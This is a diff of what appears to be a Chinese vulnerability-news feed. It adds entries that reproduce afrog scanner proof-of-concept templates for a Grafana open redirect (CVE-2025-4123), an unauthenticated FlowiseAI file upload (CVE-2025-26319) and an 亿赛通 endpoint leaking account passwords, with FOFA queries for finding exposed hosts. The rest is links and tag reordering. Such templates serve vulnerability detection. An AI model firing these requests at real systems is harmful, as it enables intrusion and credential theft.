@@ -4,6 +4,195 @@
   
   
   <entry>
+    <title>Grafana开放重定向&amp;服务端请求伪造漏洞</title>
+    <link href="/2025/06/10/github_3060962644/"/>
+    <url>/2025/06/10/github_3060962644/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> Grafana开放重定向&amp;服务端请求伪造漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-4123</li></ul><p><strong>漏洞类型：</strong> 服务器端请求伪造</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该漏洞允许攻击者通过自定义前端插件将用户重定向到恶意网站，并执行任意 JаvаSсriрt 代码。</p><p><strong>产品厂商：</strong> Grafana</p><p><strong>产品名称：</strong> Grafana</p><p><strong>影响版本：</strong> 8.0.0 ≤ version &lt;10.4.18、11.2.0 ≤ version &lt;11.2.9、11.3.0 ≤ version &lt;11.3.6、11.4.0 ≤ version &lt;11.4.4、11.5.0 ≤ version &lt;11.5.4、11.6.0 ≤ version &lt;11.6.1、12.0.0 ≤ version &lt;12.0.1</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-4123.yaml">https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-4123.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">4123</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Grafana开放重定向&amp;服务端请求伪造漏洞<br>  <span class="hljs-params">author:</span> free2e<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">description:</span> |<br>    该漏洞允许攻击者通过自定义前端插件将用户重定向到恶意网站，并执行任意 JаvаSсriрt 代码。<br>  <span class="hljs-params">affected:</span> <span class="hljs-number">8.0</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">10.4</span>.<span class="hljs-number">18</span> 、<span class="hljs-number">11.2</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">11.2</span>.<span class="hljs-number">9</span> 、<span class="hljs-number">11.3</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">11.3</span>.<span class="hljs-number">6</span>、 <span class="hljs-number">11.4</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">11.4</span>.<span class="hljs-number">4</span> 、<span class="hljs-number">11.5</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">11.5</span>.<span class="hljs-number">4</span> 、<span class="hljs-number">11.6</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">11.6</span>.<span class="hljs-number">1</span> 、 <span class="hljs-number">12.0</span>.<span class="hljs-number">0</span> ≤ grafana <span class="hljs-operator">&lt;</span><span class="hljs-number">12.0</span>.<span class="hljs-number">1</span> <br>  <span class="hljs-params">solutions:</span> 目前厂商已发布升级补丁以修复漏洞https:<span class="hljs-operator">//</span>grafana.com<span class="hljs-operator">/</span>security<span class="hljs-operator">/</span>security-advisories<span class="hljs-operator">/</span>cve-<span class="hljs-number">202</span>5-<span class="hljs-number">4123</span><span class="hljs-operator">/</span>、https:<span class="hljs-operator">//</span>grafana.com<span class="hljs-operator">/</span>blog<span class="hljs-operator">/</span><span class="hljs-number">2025</span><span class="hljs-operator">/</span><span class="hljs-number">05</span><span class="hljs-operator">/</span><span class="hljs-number">21</span><span class="hljs-operator">/</span>grafana-security-release-high-severity-security-fix-for-cve-<span class="hljs-number">202</span>5-<span class="hljs-number">4123</span><span class="hljs-symbol">/</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//mp.weixin.qq.com/s/URckOUcTYvZR4rh9MS9T_w</span><br>  <span class="hljs-params">tags:</span> Grafana、CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">4123</span><br><br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> GET<br>      <span class="hljs-params">path:</span> <span class="hljs-operator">/</span>public<span class="hljs-operator">/</span>..%<span class="hljs-number">2</span>F%<span class="hljs-number">5</span>ddfaggust.pro%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>f%<span class="hljs-number">2</span>F..%<span class="hljs-number">2</span>F..<br>    <span class="hljs-params">expression:</span> |<br>      response.status <span class="hljs-operator">==</span> <span class="hljs-number">302</span> <span class="hljs-operator">&amp;&amp;</span> <br>      response.headers[<span class="hljs-string">&quot;location&quot;</span>].contains(<span class="hljs-string">&quot;dfaggust.pro&quot;</span>) <span class="hljs-operator">&amp;&amp;</span> <br>      response.body.bcontains(b&#x27;<span class="hljs-operator">&lt;</span>a href<span class="hljs-operator">=</span><span class="hljs-string">&quot;/]dfaggust.pro/?/../../&quot;</span><span class="hljs-operator">&gt;</span>Found<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>a<span class="hljs-operator">&gt;</span>.&#x27;)<br><span class="hljs-params">expression:</span> r0()<br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>服务器端请求伪造</tag>
+      
+      <tag>zan8in/afrog:github commit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>FlowiseAI 未授权任意文件写入漏洞</title>
+    <link href="/2025/06/10/github_210052671/"/>
+    <url>/2025/06/10/github_210052671/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> FlowiseAI 未授权任意文件写入漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-26319</li></ul><p><strong>漏洞类型：</strong> 文件上传</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> FlowiseAI 是一款开源的低代码&#x2F;无代码工具，用于快速构建基于大语言模型（LLM）的应用程序。该漏洞存在于 Flowise 的 &#x2F;арi&#x2F;v1&#x2F;аttасhmеntѕ 中，允许未经身份验证的攻击者通过“知识上传”功能将任意文件上传到托管代理的服务器，此缺陷可能使攻击者能够通过上传恶意文件、脚本、配置文件甚至 SSH 密钥来远程控制整个服务器。</p><p><strong>产品厂商：</strong> FlowiseAI</p><p><strong>产品名称：</strong> FlowiseAI</p><p><strong>搜索语法：</strong> app&#x3D;”FlowiseAI”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-26319.yaml">https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-26319.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">26319</span><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> FlowiseAI 未授权任意文件写入漏洞<br>  <span class="hljs-params">author:</span> avic123<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">description:</span> |<br>    FlowiseAI 是一款开源的低代码<span class="hljs-operator">/</span>无代码工具，用于快速构建基于大语言模型（LLM）的应用程序。该漏洞存在于 Flowise 的 <span class="hljs-operator">/</span>арi<span class="hljs-operator">/</span>v1<span class="hljs-operator">/</span>аttасhmеntѕ 中，允许未经身份验证的攻击者通过“知识上传”功能将任意文件上传到托管代理的服务器，此缺陷可能使攻击者能够通过上传恶意文件、脚本、配置文件甚至 SSH 密钥来远程控制整个服务器。<br>    fofa：app<span class="hljs-operator">=</span><span class="hljs-string">&quot;FlowiseAI&quot;</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//mp.weixin.qq.com/s/Htyu1_SpOvAYb1VaZDYGjA</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,flowiseAI,fileupload<br>  <span class="hljs-params">created:</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/06/10</span><br><br><span class="hljs-params">set:</span><br>  <span class="hljs-params">hostname:</span> request.url.host<br>  <span class="hljs-params">randstr:</span> randomLowercase(<span class="hljs-number">8</span>)<br>  <span class="hljs-params">rboundary:</span> randomLowercase(<span class="hljs-number">33</span>)<br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> POST<br>      <span class="hljs-params">path:</span> <span class="hljs-symbol">/api/v1/attachments/test/test</span><br>      <span class="hljs-params">headers:</span><br>        <span class="hljs-params">Content-Type:</span> multipart<span class="hljs-symbol">/form-data</span>; <span class="hljs-attr">boundary</span><span class="hljs-operator">=</span><span class="hljs-operator">-</span>-------&#123;&#123;rboundary&#125;&#125;<br>      <span class="hljs-params">body:</span> |<br><br>        <span class="hljs-operator">-</span>---------&#123;&#123;rboundary&#125;&#125;<br>        <span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;file&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;&#123;randstr&#125;&#125;.txt&quot;</span><br>        <span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/plain</span> <br><br>        &#123;&#123;randstr&#125;&#125;<br>        <span class="hljs-operator">-</span>---------&#123;&#123;rboundary&#125;&#125;--<br>    <span class="hljs-params">expression:</span> response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b&#x27;<span class="hljs-string">&quot;name&quot;</span>&#x27;) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(b&#x27;<span class="hljs-string">&quot;content&quot;</span>:&#x27;) <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(bytes(randstr))<br><br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>文件上传</tag>
+      
+      <tag>zan8in/afrog:github commit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>亿赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞</title>
+    <link href="/2025/06/10/github_2974453440/"/>
+    <url>/2025/06/10/github_2974453440/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><blockquote><p>注: 本模块来自 AI 可能存在错误 </p></blockquote><p><strong>漏洞名称：</strong> 亿赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞</p><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 亿赛通电子文档安全管理系统 &#x2F;CDGServer3&#x2F;openapi&#x2F;getAllUsers 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，进一步MD5解密即可登录后台，使系统处于极不安全的状态。</p><p><strong>产品厂商：</strong> 亿赛通</p><p><strong>产品名称：</strong> 电子文档安全管理系统</p><p><strong>搜索语法：</strong> body&#x3D;”&#x2F;CDGServer3&#x2F;index.jsp”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fvulnerability%2Fyisaitong-getallusers-disclosure.yaml">https://github.com/zan8in/afrog/blob/8c32dffda4bd070656bb289975be97489be8120d/pocs%2Ftemp%2Fafrog-pocs%2Fvulnerability%2Fyisaitong-getallusers-disclosure.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="原始信息"><a href="#原始信息" class="headerlink" title="原始信息"></a>原始信息</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> yisaitong-getallusers-disclosure<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> 亿赛通电子文档安全管理系统 getAllUsers 信息泄露漏洞<br>  <span class="hljs-params">author:</span> Superhero<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> |-<br>    <span class="hljs-params">fofa:</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;/CDGServer3/index.jsp&quot;</span><br>    亿赛通电子文档安全管理系统 <span class="hljs-symbol">/CDGServer3/openapi/getAllUsers</span> 接口处存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，进一步MD5解密即可登录后台，使系统处于极不安全的状态。<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>mp.weixin.qq.com<span class="hljs-operator">/</span>s<span class="hljs-operator">?</span>__biz<span class="hljs-operator">=</span>MzkzMTcwMTg1Mg<span class="hljs-operator">==</span>&amp;mid<span class="hljs-operator">=</span><span class="hljs-number">2247486682</span>&amp;idx<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;sn<span class="hljs-operator">=</span><span class="hljs-number">668809</span>e5f2f46672da6cf65f924a2697&amp;chksm<span class="hljs-operator">=</span>c267b9e9f51030ff79539087a735c4a95094cc4a94528a5e6521769d9e74903c9fc1a3d94d55&amp;token<span class="hljs-operator">=</span><span class="hljs-number">522460222</span>&amp;lang<span class="hljs-operator">=</span>zh_CN<span class="hljs-comment">#rd</span><br>  <span class="hljs-params">tags:</span> Information disclosure<br><br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> POST<br>      <span class="hljs-params">path:</span> <span class="hljs-symbol">/CDGServer3/openapi/getAllUsers</span><br>      <span class="hljs-params">body:</span> pageSize<span class="hljs-operator">=</span><span class="hljs-number">100</span>&amp;pageNumber<span class="hljs-operator">=</span><span class="hljs-number">1</span><br>    <span class="hljs-params">expression:</span> |<br>      response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> <br>      response.body.bcontains(b&#x27;password&#x27;) <span class="hljs-operator">&amp;&amp;</span> <br>      response.body.bcontains(b&#x27;username&#x27;) <span class="hljs-operator">&amp;&amp;</span><br>      response.body.bcontains(b&#x27;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">0</span>&#x27;) <span class="hljs-operator">&amp;&amp;</span><br>      response.body.bcontains(b&#x27;surname&#x27;) <span class="hljs-operator">&amp;&amp;</span><br>      response.body.bcontains(b&#x27;mobilephone&#x27;)<br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>信息泄露</tag>
+      
+      <tag>zan8in/afrog:github commit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>CNVD漏洞周报2025年第21期</title>
+    <link href="/2025/06/10/weixin_3853895616/"/>
+    <url>/2025/06/10/weixin_3853895616/</url>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 国家互联网应急中心CNCERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Vk6rAVlxcyUPjxOfVlVoJg">https://mp.weixin.qq.com/s/Vk6rAVlxcyUPjxOfVlVoJg</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>微信公众号</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>mp.weixin.qq.com</tag>
+      
+      <tag>国家互联网应急中心CNCERT</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>卡巴斯基报告，APT组织针对独联体国家</title>
+    <link href="/2025/06/10/weixin_773655140/"/>
+    <url>/2025/06/10/weixin_773655140/</url>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/Ppc7V_QFL6EHCcWP1FKwNA">https://mp.weixin.qq.com/s/Ppc7V_QFL6EHCcWP1FKwNA</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>微信公众号</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>mp.weixin.qq.com</tag>
+      
+      <tag>军哥网络安全读报</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>SentinelOne称，网络间谍组织针对其开展了长达一年的侦察活动</title>
+    <link href="/2025/06/10/weixin_2525301675/"/>
+    <url>/2025/06/10/weixin_2525301675/</url>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/r2F_OrnKfEiRrz9wr4-oTQ">https://mp.weixin.qq.com/s/r2F_OrnKfEiRrz9wr4-oTQ</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>微信公众号</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>mp.weixin.qq.com</tag>
+      
+      <tag>军哥网络安全读报</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>Kimsuky 针对 Facebook、电子邮件和 Telegram 的协同攻击</title>
+    <link href="/2025/06/10/weixin_2599354213/"/>
+    <url>/2025/06/10/weixin_2599354213/</url>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 军哥网络安全读报</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/YV_CBqaYjkR2NLXcUey-1A">https://mp.weixin.qq.com/s/YV_CBqaYjkR2NLXcUey-1A</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>微信公众号</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>mp.weixin.qq.com</tag>
+      
+      <tag>军哥网络安全读报</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>WordPress Celestial Aura Theme 任意文件上传漏洞</title>
     <link href="/2025/06/10/github_2748281995/"/>
     <url>/2025/06/10/github_2748281995/</url>
@@ -585,9 +774,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2023:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -720,9 +909,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -963,9 +1152,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -1341,9 +1530,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -1611,9 +1800,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -1773,9 +1962,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2023:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -2178,9 +2367,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2716,9 +2905,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2743,9 +2932,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2770,9 +2959,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -2959,9 +3148,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>跨站可执行脚本</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3013,9 +3202,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3094,9 +3283,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3553,9 +3742,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3607,9 +3796,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3634,9 +3823,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3661,9 +3850,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3688,9 +3877,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>跨站可执行脚本</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -3904,9 +4093,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4255,9 +4444,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4471,9 +4660,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2023:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -4957,9 +5146,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -4984,9 +5173,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -5684,9 +5873,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -7049,9 +7238,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -7076,9 +7265,9 @@
     
     <tags>
       
-      <tag>其他</tag>
-      
       <tag>CVE-2024:github search</tag>
+      
+      <tag>其他</tag>
       
     </tags>
     
@@ -7203,9 +7392,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>权限绕过</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -7257,9 +7446,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>其他</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
@@ -7338,9 +7527,9 @@
     
     <tags>
       
-      <tag>CVE-2025:github search</tag>
-      
       <tag>跨站可执行脚本</tag>
+      
+      <tag>CVE-2025:github search</tag>
       
     </tags>
     
